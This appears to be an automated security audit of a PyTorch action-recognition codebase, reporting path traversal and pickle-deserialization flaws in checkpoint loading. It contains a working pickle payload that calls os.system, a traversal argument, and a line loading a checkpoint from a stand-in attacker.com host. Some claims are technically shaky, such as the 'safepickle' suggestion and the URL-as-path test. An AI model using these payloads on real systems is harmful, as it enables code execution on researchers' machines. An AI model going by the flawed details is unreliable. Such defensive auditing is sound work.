## Combined Vulnerability Report

The following vulnerabilities have been identified in the provided lists. These vulnerabilities pose significant security risks and require immediate attention and mitigation.

### Vulnerability 1: Path Traversal in Checkpoint Loading

- **Description:**
    1. The application uses command-line arguments such as `--load_ckpt_path`, `--visual_encoder_ckpt_path`, and `--ckpt_path` to specify the directory or path from which to load model checkpoints. These arguments are used in `detection/run.py` and `classification/run.py` scripts.
    2. In the `load` functions within `/code/detection/model.py` and `/code/classification/model.py`, these user-provided paths are directly used with `os.path.join` to construct the full checkpoint file path.
    3. The `torch.load` function is then called on this constructed path to load the checkpoint file.
    4. An attacker can exploit this by providing a maliciously crafted path containing path traversal sequences (e.g., `../`, `../../`) as a value for `--load_ckpt_path` or related arguments.
    5. This allows the attacker to bypass intended directory restrictions and point `torch.load` to load files from arbitrary locations on the file system, outside the designated checkpoint directories, potentially leading to arbitrary file read.

- **Impact:**
    - Arbitrary File Read: A successful path traversal exploit allows an attacker to read arbitrary files from the system's file system, limited by the permissions of the user running the training or testing scripts.
    - Information Disclosure: This can lead to the disclosure of sensitive information, including configuration files, source code, data files, or other potentially confidential system files accessible to the user running the script.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. The code directly uses user-provided paths without any sanitization or validation before using them in file operations.

- **Missing Mitigations:**
    - Input Sanitization: Implement sanitization of user-provided file paths to prevent path traversal. This could involve:
        - Validating that the provided path does not contain path traversal sequences like `../` or `..\\`.
        - Using `os.path.abspath` to resolve the path and then verifying that the resolved path is within an expected base directory (e.g., the project's checkpoint directory).
    - Input Validation: Implement strict input validation to ensure that the provided paths conform to expected patterns and formats, further reducing the risk of malicious path manipulation.

- **Preconditions:**
    - An attacker must be able to influence the command-line arguments passed to the Python training or testing scripts (`classification/run.py`, `detection/run.py`). This could be achieved by:
        - Social engineering: Persuading a user to execute a script with attacker-controlled arguments.
        - Supply chain attack: Compromising a script or configuration file that invokes these training/testing scripts, allowing modification of the arguments.

- **Source Code Analysis:**
    - **File: `/code/detection/model.py`**
        ```python
        def load(self, load_ckpt_paths, options, epoch=200):
          """Load checkpoints.
          """
          assert len(load_ckpt_paths) == len(self.embeds)
          for i in range(len(self.embeds)):
            ckpt_path = load_ckpt_paths[i]
            load_opt = options[i]
            if len(ckpt_path) == 0:
              utils.info('{}: training from scratch'.format(self.modalities[i]))
              continue

            if load_opt == 0:  # load teacher model (visual + sequence)
              path = os.path.join(ckpt_path, 'embed_{}.pth'.format(epoch)) # [VULNERABLE]: Path constructed using user input without sanitization.
              ckpt = torch.load(path) # [VULNERABLE]: File loaded from potentially attacker-controlled path.
              try:
                self.embeds[i].load_state_dict(ckpt)
              except:
                utils.warn('Check that the "modalities" argument is correct.')
                exit(0)
              utils.info('{}: ckpt {} loaded'.format(self.modalities[i], path))
            elif load_opt == 1:  # load pretrained visual encoder
              ckpt = torch.load(ckpt_path) # [VULNERABLE]: File loaded from potentially attacker-controlled path.
              # Change keys in the ckpt
              new_state_dict = OrderedDict()
              for key in list(ckpt.keys())[:-2]:  # exclude fc weights
                new_key = key[7:]  # Remove 'module.'
                new_state_dict[new_key] = ckpt[key]
              # update state_dict
              state_dict = self.embeds[i].module.embed.state_dict()
              state_dict.update(new_state_dict)
              self.embeds[i].module.embed.load_state_dict(state_dict)
              utils.info('{}: visual encoder from {} loaded'.format(
                  self.modalities[i], ckpt_path))
            else:
              raise NotImplementedError
        ```
    - **File: `/code/classification/model.py`**
        ```python
        def load(self, load_ckpt_paths, epoch=200):
          """Load trained models."""
          assert len(load_ckpt_paths) == len(self.embeds)
          for i, ckpt_path in enumerate(load_ckpt_paths):
            if len(ckpt_path) > 0:
              path = os.path.join(ckpt_path, 'embed_{}.pth'.format(epoch)) # [VULNERABLE]: Path constructed using user input without sanitization.
              self.embeds[i].load_state_dict(torch.load(path)) # [VULNERABLE]: File loaded from potentially attacker-controlled path.
              utils.info('{}: ckpt {} loaded'.format(self.modalities[i], path))
            else:
              utils.info('{}: training from scratch'.format(self.modalities[i]))
        ```
    The code in both `detection/model.py` and `classification/model.py` directly utilizes the `ckpt_path` variable, which originates from user-supplied command-line arguments, in `os.path.join` and `torch.load` without any form of sanitization or validation. This direct usage creates a path traversal vulnerability.

- **Security Test Case:**
    1. Create a test file at a known location outside the project directory, for example, `/tmp/test_checkpoint.txt`, containing arbitrary text content.
    2. Modify the test script (e.g., `scripts/test_ntu_rgbd.sh`) to include a malicious `--load_ckpt_path` argument designed to traverse to the `/tmp` directory and attempt to load `test_checkpoint.txt`. For example, change the script to include:
        ```bash
        --load_ckpt_path '../../../../../tmp'
        ```
    3. In the relevant `load` function (e.g., in `/code/classification/model.py`), temporarily add code to print the absolute path being loaded and attempt to load the checkpoint:
        ```python
        path = os.path.join(ckpt_path, 'embed_{}.pth'.format(epoch))
        print(f"Attempting to load checkpoint from path: {path}") # Added for test
        try:
            ckpt = torch.load(path)
            print("Checkpoint loaded successfully (This should not happen in a successful exploit if /tmp/test_checkpoint.txt is not a valid checkpoint file).")
        except Exception as e:
            print(f"Error loading checkpoint (Expected in successful exploit): {e}") # Added for test
        ```
    4. Run the modified test script.
    5. Observe the output. If the output in the console indicates that the script attempted to load a file from a path that resolves to `/tmp/test_checkpoint.txt` (or a similar path outside the intended checkpoint directory) and an error related to loading an invalid checkpoint is raised (as `/tmp/test_checkpoint.txt` is not a valid checkpoint file), it confirms the path traversal vulnerability. A successful exploit is demonstrated by the ability to direct the application to attempt loading a file from an arbitrary location.


### Vulnerability 2: Pickle Deserialization leading to Remote Code Execution

- **Description:**
    1. The `load` functions in `detection/model.py` and `classification/model.py` use `torch.load` to load model checkpoints from user-specified paths (`load_ckpt_paths`, `visual_encoder_ckpt_path`, `pretrained_ckpt_name`).
    2. `torch.load` in PyTorch, by default, uses Python's `pickle` module for deserialization, which is known to be vulnerable to deserialization attacks. If a pickle file is maliciously crafted, it can execute arbitrary code when loaded.
    3. The `scripts/download_models.sh` script downloads pretrained models from a remote Google Cloud Storage location (`https://storage.googleapis.com/graph_distillation/ckpt/`).
    4. If an attacker can compromise the Google Cloud Storage bucket (or a mirror/copy of the models), or trick a user into downloading a malicious model from a different location (e.g., through a man-in-the-middle attack or social engineering), the user will unknowingly execute the malicious code when loading the model using the provided scripts or by manually specifying the path to the malicious model.
    5. The training and testing scripts (`scripts/train_*.sh`, `scripts/test_*.sh`) utilize command-line arguments like `--load_ckpt_path` and `--visual_encoder_ckpt_path`, which can be pointed to a malicious checkpoint file.

- **Impact:**
    - Arbitrary code execution on the user's machine.
    - Full compromise of the user's system.
    - Potential for data theft, malware installation, or denial of service.
    - Data exfiltration: Sensitive research data, credentials, or personal files could be stolen.
    - System compromise: The attacker could gain full control of the researcher's machine, install backdoors, or use it for further attacks.
    - Research disruption: The researcher's work could be sabotaged, models corrupted, or experiments manipulated.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - None. The project does not implement any security measures to verify the integrity or authenticity of the downloaded pretrained models. There are no checks like cryptographic signatures or checksums to ensure the models are from a trusted source and haven't been tampered with. The code directly uses `torch.load` without any input validation or security checks on the checkpoint files.

- **Missing Mitigations:**
    - Integrity Checks: Implement cryptographic signatures or checksums for the pretrained model files. The project should verify these signatures before loading the models to ensure they are from a trusted source and haven't been modified.
    - Secure Deserialization Practices: Explore safer alternatives to `pickle` for serializing and deserializing models, or implement secure loading mechanisms for pickle files to prevent arbitrary code execution. Consider using `torch.load(..., pickle_module=safepickle)`.
    - Input validation: Implement checks to ensure that the provided checkpoint paths are within expected directories and potentially verify the integrity of the downloaded files (e.g., using checksums).
    - User Warnings: Add clear warnings in the documentation (README.md) about the potential risks of using pretrained models from external sources and the importance of verifying their integrity. Recommend verifying the source and integrity of downloaded models.

- **Preconditions:**
    - The user must execute the `scripts/download_models.sh` script to download the pretrained models, or otherwise obtain a malicious model.
    - The user must then run training or testing scripts that load these downloaded models using `torch.load`, or manually load a malicious model.

- **Source Code Analysis:**
    - **`scripts/download_models.sh`**:
        ```bash
        wget https://storage.googleapis.com/graph_distillation/ckpt/ntu-rgbd/depth.zip
        wget https://storage.googleapis.com/graph_distillation/ckpt/ntu-rgbd/jjd.zip
        ...
        ```
        This script uses `wget` to download zip files containing pretrained models from Google Cloud Storage. There is no verification of the downloaded files.
    - **`detection/model.py`** and **`classification/model.py`**:
        ```python
        def load(self, load_ckpt_paths, options, epoch=200): # detection/model.py
        def load(self, load_ckpt_paths, epoch=200): # classification/model.py
            ...
            for i in range(len(self.embeds)): # detection/model.py
            for i, ckpt_path in enumerate(load_ckpt_paths): # classification/model.py
              ckpt_path = load_ckpt_paths[i] # detection/model.py - inside loop
              if len(ckpt_path) > 0:
                path = os.path.join(ckpt_path, 'embed_{}.pth'.format(epoch))
                ckpt = torch.load(path) # [VULNERABLE]: vulnerable to pickle deserialization
                try:
                  self.embeds[i].load_state_dict(ckpt)
                except:
                  utils.warn('Check that the "modalities" argument is correct.')
                  exit(0)
                utils.info('{}: ckpt {} loaded'.format(self.modalities[i], path))
        ```
        The `load` functions in `detection/model.py` and `classification/model.py` use `torch.load(path)` to load the model checkpoints. This function is vulnerable to pickle deserialization attacks if the file at `path` is maliciously crafted.

- **Security Test Case:**
    1. **Setup (Attacker):**
        - Create a malicious Python file (e.g., `malicious_payload.py`) with the following code to generate a malicious pickle file:
            ```python
            import torch
            import os

            class MaliciousModel(object):
                def __reduce__(self):
                    return (os.system, ('touch /tmp/pwned',)) # Example: create a file /tmp/pwned, can be replaced with more harmful commands

            model = MaliciousModel()
            torch.save(model, 'malicious_model.pth')
            ```
        - Run the malicious Python script: `python malicious_payload.py`. This will create a malicious pickle file named `malicious_model.pth`.
        - Host `malicious_model.pth` on a web server accessible to the victim machine (e.g., `https://attacker.com/malicious_model.pth`).

    2. **Action (Victim):**
        - Modify one of the test scripts (e.g., `scripts/test_ntu_rgbd.sh`) to use the malicious checkpoint by changing the `--load_ckpt_path` argument to point to the attacker's hosted file:
        ```bash
        python -m classification.run \
          --gpus 0 \
          --split test \
          --dset ntu-rgbd \
          --load_ckpt_path https://attacker.com/malicious_model.pth \  # Malicious path
          --modalities rgb
        ```
        - Run the modified script: `sh scripts/test_ntu_rgbd.sh`.

    3. **Verification:**
        - After running the script, check if the file `/tmp/pwned` exists on the victim's system. If it exists, it confirms that the arbitrary code execution was successful due to the pickle deserialization vulnerability.